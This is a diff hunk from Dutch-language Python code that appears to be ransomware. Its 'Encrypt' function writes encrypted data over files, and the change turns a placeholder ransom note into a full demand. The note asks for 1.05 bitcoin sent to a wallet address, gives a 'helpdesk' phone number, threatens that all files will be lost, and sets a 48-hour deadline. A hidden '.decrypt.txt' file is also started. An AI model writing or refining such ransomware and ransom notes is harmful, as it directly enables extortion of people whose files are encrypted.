@@ -72,7 +72,7 @@ def Encrypt(bestandenlijst):
          f.write(versleutelde_data)
    #Readme aanmaken.
    Readme = open("README.txt","w")
-   Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\nOm je bestanden tedecrypten moet je geld overmaken naar XXX.\nDan zal je de decryptkey ontvangen!")
+   Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\nOm je bestanden tedecrypten moet je 1.05 bitcoin overmaken naar bc1q7x9k0m3v5d8r2p4s6nqj9l8f0wz5c2e7a4y.\nDan zal je de decryptkey ontvangen!\nBekijk op deze link: https://bitcoin.nl/gids/startersgids hoe je bitcoin kan kopen en overmaken.\nBij eventuele vragen kunt uw contact opnemen met onze helpdesk op: +7 912 345‑67‑89\nWees uw ervan bewust dat zonder onze decryptkey AL UW BESTANDEN verloren zullen gaan.\nWe adviseren uw dan ook zo snel mogelijk te betalen, als uw binnen 48 uur betaalt zullen wij een gratis advies om dit soort aanvallen te voorkomen geven.")
    Readme.close()
    #Decryptfile aanmaken.
    Decrypt = open(".decrypt.txt","w")
